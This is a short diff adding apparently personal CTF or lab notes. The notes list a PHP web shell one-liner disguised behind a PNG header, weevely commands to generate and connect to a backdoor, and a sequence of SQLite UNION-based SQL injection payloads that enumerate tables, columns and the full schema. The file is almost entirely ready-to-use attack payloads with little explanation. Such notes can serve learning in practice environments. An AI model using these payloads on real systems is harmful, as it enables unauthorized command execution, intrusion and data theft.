@@ -1,0 +1,24 @@
+trickster:
+=====================================================================================================
+PNG
+<?php system($_GET['cmd']) ;?>
+reverse shell
+php server 
+php -S localhost:8080
+
+└─$ weevely generate 123 payload.php  
+weevely terminal http//:localhost/payload.php
+============================================================================================
+sql injection 
+===========================================================================================
+Algiers' UNION SELECT 1,2,3 -- - ( know how many columns
+Algiers' UNION SELECT 1,2,tbl_name from sqlite_master -- -
+or 
+Algiers' UNION SELECT 1,2,GROUP_CONCAT(tbl_name) from sqlite_master -- -
+know the system tables from here ==>( https://www.techonthenet.com/sqlite/sys_tables/index.php)
+Algiers' UNION SELECT 1,2,name from PRAGMA_table_info('more_table') -- -          get the table columns 
+Algiers' UNION SELECT 1,2,SQL  from sqlite_master -- - GET THE CREATE DATA BASE FULL SQL !!
+=========================================================================================
+for jwt , use jwt.io or this if that didnt work:https://10015.io/tools/jwt-encoder-decoder
+===========================================================================================
+
